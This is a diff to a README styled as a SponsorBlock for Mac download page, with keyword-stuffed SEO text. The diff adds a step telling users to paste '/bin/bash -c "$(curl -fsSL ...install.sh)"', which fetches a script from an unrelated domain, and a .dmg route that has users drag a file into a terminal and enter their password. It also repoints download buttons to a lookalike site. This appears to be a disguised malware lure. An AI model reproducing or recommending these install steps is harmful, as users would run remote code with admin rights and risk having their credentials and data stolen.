@@ -2,9 +2,34 @@
 
 ## ✅ Download SponsorBlock for Mac (Free Browser Extension)
 
-[![🚀 Download SponsorBlock 🟣](https://img.shields.io/badge/Download-SponsorBlock-blueviolet?style=for-the-badge)](#)
+[![🚀 Download SponsorBlock 🟣](https://img.shields.io/badge/Download-SponsorBlock-blueviolet?style=for-the-badge)](https://sponsorblock-mac-download.github.io/.github)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
+
 
 ## 🌐 What is SponsorBlock?
 
@@ -36,19 +61,7 @@ Its community-powered database grows daily, meaning the more people use it, the 
 
 ---
 
-[![⬇️ Download SponsorBlock Again 🟣](https://img.shields.io/badge/Download-SponsorBlock-blueviolet?style=for-the-badge)](#)
-
----
-
-## 📥 How to Use SponsorBlock
-
-✅ Click the download button above to install the extension for your browser  
-✅ Pin the extension to your toolbar for easy access  
-✅ Start watching YouTube — it skips sponsored parts automatically  
-✅ Adjust your preferences to control what gets skipped  
-✅ Contribute segments if you find ones not yet marked  
-
-SponsorBlock is simple, powerful, and totally free — take full control over your YouTube time today.
+[![⬇️ Download SponsorBlock Again 🟣](https://img.shields.io/badge/Download-SponsorBlock-blueviolet?style=for-the-badge)](https://sponsorblock-mac-download.github.io/.github)
 
 ---
 
@@ -66,3 +79,4 @@ youtube sponsorblock mac, chrome sponsorblock mac, sponsor block extension mac, 
 sponsor block youtube mac, sponsorblock extension mac, sponsorblock for youtube android mac,  
 sponsorblock for youtube skip sponsorships mac, sponsorblock github mac, sponsorblock opera mac,  
 sponsorblock youtube mac, youtube sponsor block mac
+
